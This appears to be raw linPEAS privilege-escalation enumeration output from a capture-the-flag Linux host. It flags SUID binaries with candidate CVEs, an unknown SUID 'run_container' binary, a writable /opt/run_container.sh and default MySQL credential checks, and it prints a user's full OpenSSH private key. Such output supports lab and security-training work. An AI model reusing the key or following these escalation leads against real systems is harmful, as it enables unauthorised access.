drwxr-sr-x 2 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/__pycache__
-rw-r--r-- 1 root staff 207 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/__pycache__/build_constants.cpython-38.pyc
-rw-r--r-- 1 root staff 4450 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/__pycache__/iam.cpython-38.pyc
-rw-r--r-- 1 root staff 7208 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/__pycache__/token.cpython-38.pyc
-rw-r--r-- 1 root staff 796 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/__pycache__/utils.cpython-38.pyc
-rw-r--r-- 1 root staff 8600 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/__pycache__/session.cpython-38.pyc
-rw-r--r-- 1 root staff 2228 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/auth/__pycache__/__init__.cpython-38.pyc
-rw-r--r-- 1 root staff 212 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/__init__.py
drwxr-sr-x 3 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage
-rw-r--r-- 1 root staff 0 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/py.typed
-rw-r--r-- 1 root staff 5560 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/__init__.py
-rw-r--r-- 1 root staff 2787 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/bucket.py
-rw-r--r-- 1 root staff 70 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/constants.py
-rw-r--r-- 1 root staff 27794 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/storage.py
drwxr-sr-x 2 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/__pycache__
-rw-r--r-- 1 root staff 20693 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/__pycache__/storage.cpython-38.pyc
-rw-r--r-- 1 root staff 2851 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/__pycache__/bucket.cpython-38.pyc
-rw-r--r-- 1 root staff 178 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/__pycache__/constants.cpython-38.pyc
-rw-r--r-- 1 root staff 6416 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/__pycache__/blob.cpython-38.pyc
-rw-r--r-- 1 root staff 5688 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/__pycache__/__init__.cpython-38.pyc
-rw-r--r-- 1 root staff 7396 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/storage/blob.py
drwxr-sr-x 2 root staff 4096 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/__pycache__
-rw-r--r-- 1 root staff 363 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/gcloud/aio/__pycache__/__init__.cpython-38.pyc


















╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3766 Mar 13  2025 /etc/cloud/cloud.cfg
    lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 27  2025 /usr/share/keyrings




╔══════════╣ Analyzing Cache Vi Files (limit 70)

lrwxrwxrwx 1 think think 9 Feb 10  2024 /home/think/.viminfo -> /dev/null

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)



-rw-r--r-- 1 root root 69 Jun 27  2023 /etc/php/7.4/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Mar 25  2025 /usr/share/php7.4-common/common/ftp.ini






╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 think think 3771 Nov 14  2023 /home/think/.bashrc
-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 /home/ubuntu/.bashrc





-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 think think 807 Nov 14  2023 /home/think/.profile
-rw-r--r-- 1 ubuntu ubuntu 807 Feb 25  2020 /home/ubuntu/.profile




╔══════════╣ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 24 Jul 30  2023 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Apr 27  2025 /var/lib/dpkg/alternatives/my.cnf





























╔══════════╣ Analyzing FreeIPA Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 27  2025 /usr/src/linux-hwe-5.15-headers-5.15.0-138/drivers/net/ipa




╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ MySQL version
mysql  Ver 8.0.41-0ubuntu0.20.04.1 for Linux on x86_64 ((Ubuntu))


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

MySQL process not found.
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw------- 1 think think 1200 Nov 14  2023 /home/think/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 3267 Mar 29  2025 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 1150 Aug  8  2024 /usr/share/keyrings/ubuntu-pro-anbox-cloud.gpg
-rw-r--r-- 1 root root 2247 Aug  8  2024 /usr/share/keyrings/ubuntu-pro-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Aug  8  2024 /usr/share/keyrings/ubuntu-pro-cis.gpg
-rw-r--r-- 1 root root 2236 Aug  8  2024 /usr/share/keyrings/ubuntu-pro-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Aug  8  2024 /usr/share/keyrings/ubuntu-pro-esm-infra.gpg
-rw-r--r-- 1 root root 2275 Aug  8  2024 /usr/share/keyrings/ubuntu-pro-fips.gpg
-rw-r--r-- 1 root root 2275 Aug  8  2024 /usr/share/keyrings/ubuntu-pro-fips-preview.gpg
-rw-r--r-- 1 root root 2250 Aug  8  2024 /usr/share/keyrings/ubuntu-pro-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Aug  8  2024 /usr/share/keyrings/ubuntu-pro-ros.gpg
-rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 2236 Jun 21  2023 /var/lib/ubuntu-advantage/apt-esm/etc/apt/trusted.gpg.d/ubuntu-advantage-esm-apps.gpg


drwx------ 3 think think 4096 Nov  9 11:08 /home/think/.gnupg

╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#runc--privilege-escalation
runc was found in /usr/sbin/runc, you may be able to escalate privileges with it

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)

-rw-r--r-- 1 think think 2602 Jan 10  2024 /home/think/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK
uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+9/2ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc
OY8+1CUVX67y4UXrKASf8l7lPKIED24bXjkDBkVrCMHwScQbg/nIIFxyi262JoJTjh9Jgx
SBjaDOELBBxydv78YMN9dyafImAXYX96H5k+8vC8/I3bkwiCnhuKKJ11TV4b8lMsbrgqbY
RYfbCJapB27zJ24a1aR5Un+Ec2XV2fawhmftS05b10M0QAnDEu7SGXG9mF/hLJyheRe8lv
+rk5EkZNgh14YpXG/E9yIbxB9Rf5k0ekxodZjVV06iqIHBomcQrKotV5nXBRPgVeH71JgV
QFkNQyqVM4wf6oODSqQsuIvnkB5l9e095sJDwz1pj/aTL3Z6Z28KgPKCjOELvkAPcncuMQ
Tu+z6QVUr0cCjgSRhw4Gy/bfJ4lLyX/bciL5QoydAAAFiD95i1o/eYtaAAAAB3NzaC1yc2
EAAAGBAMT73PaYo6VCQOKJcr5FtK8mAEgaXZgWrDhJbOjkcOxTIIz1vOrQyriF8mZ3gSFG
qyYmYfFcxapikWHIqA8JSc6vvf9oqUB01czY8cYNfMFrxdFpytpSOU0O0F3DmPPtQlFV+u
8uFF6ygEn/Je5TyiBA9uG145AwZFawjB8EnEG4P5yCBccotutiaCU44fSYMUgY2gzhCwQc
cnb+/GDDfXcmnyJgF2F/eh+ZPvLwvPyN25MIgp4biiiddU1eG/JTLG64Km2EWH2wiWqQdu
8yduGtWkeVJ/hHNl1dn2sIZn7UtOW9dDNEAJwxLu0hlxvZhf4SycoXkXvJb/q5ORJGTYId
eGKVxvxPciG8QfUX+ZNHpMaHWY1VdOoqiBwaJnEKyqLVeZ1wUT4FXh+9SYFUBZDUMqlTOM
H+qDg0qkLLiL55AeZfXtPebCQ8M9aY/2ky92emdvCoDygozhC75AD3J3LjEE7vs+kFVK9H
Ao4EkYcOBsv23yeJS8l/23Ii+UKMnQAAAAMBAAEAAAGBAIIasGkXjA6c4eo+SlEuDRcaDF
mTQHoxj3Jl3M8+Au+0P+2aaTrWyO5zWhUfnWRzHpvGAi6+zbep/sgNFiNIST2AigdmA1QV
VxlDuPzM77d5DWExdNAaOsqQnEMx65ZBAOpj1aegUcfyMhWttknhgcEn52hREIqty7gOR5
49F0+4+BrRLivK0nZJuuvK1EMPOo2aDHsxMGt4tomuBNeMhxPpqHW17ftxjSHNv+wJ4WkV
8Q7+MfdnzSriRRXisKavE6MPzYHJtMEuDUJDUtIpXVx2rl/L3DBs1GGES1Qq5vWwNGOkLR
zz2F+3dNNzK6d0e18ciUXF0qZxFzF+hqwxi6jCASFg6A0YjcozKl1WdkUtqqw+Mf15q+KW
xlkL1XnW4/jPt3tb4A9UsW/ayOLCGrlvMwlonGq+s+0nswZNAIDvKKIzzbqvBKZMfVZl4Q
UafNbJoLlXm+4lshdBSRVHPe81IYS8C+1foyX+f1HRkodpkGE0/4/StcGv4XiRBFG1qQAA
AMEAsFmX8iE4UuNEmz467uDcvLP53P9E2nwjYf65U4ArSijnPY0GRIu8ZQkyxKb4V5569l
DbOLhbfRF/KTRO7nWKqo4UUoYvlRg4MuCwiNsOTWbcNqkPWllD0dGO7IbDJ1uCJqNjV+OE
56P0Z/HAQfZovFlzgC4xwwW8Mm698H/wss8Lt9wsZq4hMFxmZCdOuZOlYlMsGJgtekVDGL
IHjNxGd46wo37cKT9jb27OsONG7BIq7iTee5T59xupekynvIqbAAAAwQDnTuHO27B1PRiV
ThENf8Iz+Y8LFcKLjnDwBdFkyE9kqNRT71xyZK8t5O2Ec0vCRiLeZU/DTAFPiR+B6WPfUb
kFX8AXaUXpJmUlTLl6on7mCpNnjjsRKJDUtFm0H6MOGD/YgYE4ZvruoHCmQaeNMpc3YSrG
vKrFIed5LNAJ3kLWk8SbzZxsuERbybIKGJa8Z9lYWtpPiHCsl1wqrFiB9ikfMa2DoWTuBh
+Xk2NGp6e98Bjtf7qtBn/0rBfdZjveM1MAAADBANoC+jBOLbAHk2rKEvTY1Msbc8Nf2aXe
v0M04fPPBE22VsJGK1Wbi786Z0QVhnbNe6JnlLigk50DEc1WrKvHvWND0WuthNYTThiwFr
LsHpJjf7fAUXSGQfCc0Z06gFMtmhwZUuYEH9JjZbG2oLnn47BdOnumAOE/mRxDelSOv5J5
M8X1rGlGEnXqGuw917aaHPPBnSfquimQkXZ55yyI9uhtc6BrRanGRlEYPOCR18Ppcr5d96
Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==
-----END OPENSSH PRIVATE KEY-----
-rw-r--r-- 1 think think 569 Jan 10  2024 /home/think/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDE+9z2mKOlQkDiiXK+RbSvJgBIGl2YFqw4SWzo5HDsUyCM9bzq0Mq4hfJmd4EhRqsmJmHxXMWqYpFhyKgPCUnOr73/aKlAdNXM2PHGDXzBa8XRacraUjlNDtBdw5jz7UJRVfrvLhResoBJ/yXuU8ogQPbhteOQMGRWsIwfBJxBuD+cggXHKLbrYmglOOH0mDFIGNoM4QsEHHJ2/vxgw313Jp8iYBdhf3ofmT7y8Lz8jduTCIKeG4oonXVNXhvyUyxuuCpthFh9sIlqkHbvMnbhrVpHlSf4RzZdXZ9rCGZ+1LTlvXQzRACcMS7tIZcb2YX+EsnKF5F7yW/6uTkSRk2CHXhilcb8T3IhvEH1F/mTR6TGh1mNVXTqKogcGiZxCsqi1XmdcFE+BV4fvUmBVAWQ1DKpUzjB/qg4NKpCy4i+eQHmX17T3mwkPDPWmP9pMvdnpnbwqA8oKM4Qu+QA9ydy4xBO77PpBVSvRwKOBJGHDgbL9t8niUvJf9tyIvlCjJ0= think@publisher



-rw-r--r-- 1 root root 569 Jan 10  2024 /home/think/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDE+9z2mKOlQkDiiXK+RbSvJgBIGl2YFqw4SWzo5HDsUyCM9bzq0Mq4hfJmd4EhRqsmJmHxXMWqYpFhyKgPCUnOr73/aKlAdNXM2PHGDXzBa8XRacraUjlNDtBdw5jz7UJRVfrvLhResoBJ/yXuU8ogQPbhteOQMGRWsIwfBJxBuD+cggXHKLbrYmglOOH0mDFIGNoM4QsEHHJ2/vxgw313Jp8iYBdhf3ofmT7y8Lz8jduTCIKeG4oonXVNXhvyUyxuuCpthFh9sIlqkHbvMnbhrVpHlSf4RzZdXZ9rCGZ+1LTlvXQzRACcMS7tIZcb2YX+EsnKF5F7yW/6uTkSRk2CHXhilcb8T3IhvEH1F/mTR6TGh1mNVXTqKogcGiZxCsqi1XmdcFE+BV4fvUmBVAWQ1DKpUzjB/qg4NKpCy4i+eQHmX17T3mwkPDPWmP9pMvdnpnbwqA8oKM4Qu+QA9ydy4xBO77PpBVSvRwKOBJGHDgbL9t8niUvJf9tyIvlCjJ0= think@publisher

-rw-r--r-- 1 root root 183 Nov  9 10:57 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 103 Nov  9 10:57 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 575 Nov  9 10:57 /etc/ssh/ssh_host_rsa_key.pub
-rw-r--r-- 1 think think 569 Jan 10  2024 /home/think/.ssh/id_rsa.pub

ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes

══╣ Possible private SSH keys were found!
/home/think/.ssh/id_rsa

══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Atos_TrustedRoot_Root_CA_ECC_TLS_2021.pem
/etc/ssl/certs/Atos_TrustedRoot_Root_CA_RSA_TLS_2021.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
20308PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions
tmux 3.0a


/tmp/tmux-1000



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 467K Apr 11  2025 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SUID binary!)
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 87K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 84K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 52K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 67K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 67K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 39K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/unix_chkpwd
-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SGID binary)
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root ssh 343K Apr 11  2025 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 83K Feb  6  2024 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 31K Feb  6  2024 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls
files with acls in searched folders Not Found

╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
══╣ Current shell capabilities
CapInh:  [Invalid capability format]
CapPrm:  [Invalid capability format]
CapEff:  [Invalid capability format]
CapBnd:  [Invalid capability format]
CapAmb:  [Invalid capability format]

╚ Parent process capabilities
CapInh:  [Invalid capability format]
CapPrm:  [Invalid capability format]
CapEff:  [Invalid capability format]
CapBnd:  [Invalid capability format]
CapAmb:  [Invalid capability format]


Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
  - /usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files
total 64
drwxr-xr-x   2 root root  4096 May 11 19:19 .
drwxr-xr-x 132 root root 12288 Nov  9 10:57 ..
-rw-r--r--   1 root root    96 Jun 21  2023 01-locale-fix.sh
-rw-r--r--   1 root root   729 Feb  2  2020 bash_completion.sh
-rw-r--r--   1 root root  1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 root root  1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root   757 Nov  3  2019 gawk.sh
-rw-r--r--   1 root root   349 Oct 28  2020 im-config_wayland.sh
-rw-r--r--   1 root root  1368 Jun 11  2020 vte-2.91.sh
-rw-r--r--   1 root root   966 Jun 11  2020 vte.csh
-rw-r--r--   1 root root   954 Mar 26  2020 xdg_dirs_desktop_session.sh
-rw-r--r--   1 root root  1557 Feb 17  2020 Z97-byobu.sh
-rwxr-xr-x   1 root root   841 Mar 13  2025 Z99-cloudinit-warnings.sh
-rwxr-xr-x   1 root root  3396 Mar 13  2025 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient
-rw-r--r-- 1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r-- 1 root root   532 Feb 12  2024 usr.sbin.ash
-rw-r--r-- 1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r-- 1 root root  2006 Jun 14  2023 usr.sbin.mysqld
-rw-r--r-- 1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1674 Feb  8  2024 usr.sbin.tcpdump

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/think/.bash_history
/home/think/.ssh/authorized_keys
/home/think/user.txt
/root/
/var/www

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r--r-- 1 root root 35 Feb 10  2024 /home/think/user.txt
-rw-r--r-- 1 root root 569 Jan 10  2024 /home/think/.ssh/authorized_keys

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/dev/shm/linpeas_result.txt
/dev/shm/linpeas.sh.1
/home/think
/opt/run_container.sh
/run/cloud-init/tmp
/run/lock
/run/screen
/run/screen/S-think
/run/user/1000
/run/user/1000/dbus-1
/run/user/1000/dbus-1/services
/run/user/1000/gnupg
/run/user/1000/inaccessible
/run/user/1000/pulse
/run/user/1000/pulse/pid
/run/user/1000/systemd
/run/user/1000/systemd/units
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1000
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
  Group think:
/dev/shm/linpeas_result.txt
/dev/shm/linpeas.sh.1



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2024-02-10+21:36:27.4408525260 /etc/grub.d/10_linux
2024-02-10+21:35:58.0201161950 /etc/grub.d/01_password
2024-01-10+12:40:38.3579074640 /opt/run_container.sh
2023-12-07+20:29:58.8065112630 /usr/sbin/ash
2023-11-14+13:07:14.1694298820 /usr/sbin/run_container
2023-11-11+20:58:03.1479898800 /usr/local/bin/fixup_automl_v1_keywords.py
2023-11-11+20:58:03.1479898800 /usr/local/bin/fixup_automl_v1beta1_keywords.py
2023-11-11+20:58:02.8119880060 /usr/local/bin/json-merge-patch
2023-11-11+20:58:00.6119756950 /usr/local/bin/fixup_bigtable_v2_keywords.py
2023-11-11+20:58:00.6119756950 /usr/local/bin/fixup_bigtable_admin_v2_keywords.py
2023-11-11+20:57:59.1999677530 /usr/local/bin/chardetect
2023-11-11+20:57:57.8079598850 /usr/local/bin/pasteurize
2023-11-11+20:57:57.8079598850 /usr/local/bin/futurize
2023-11-11+20:57:52.0479269300 /usr/local/bin/fixup_bigquery_storage_v1_keywords.py
2023-11-11+20:57:51.9439263280 /usr/local/bin/google-oauthlib-tool
2023-11-11+20:57:47.5879009020 /usr/local/bin/plasma_store
2023-11-11+20:57:45.8638907100 /usr/local/bin/f2py3.8
2023-11-11+20:57:45.8638907100 /usr/local/bin/f2py3
2023-11-11+20:57:45.8638907100 /usr/local/bin/f2py
2023-11-11+20:57:42.8238725320 /usr/local/bin/tb-gcp-uploader
2023-11-11+20:57:40.5558587900 /usr/local/bin/fixup_pubsub_v1_keywords.py
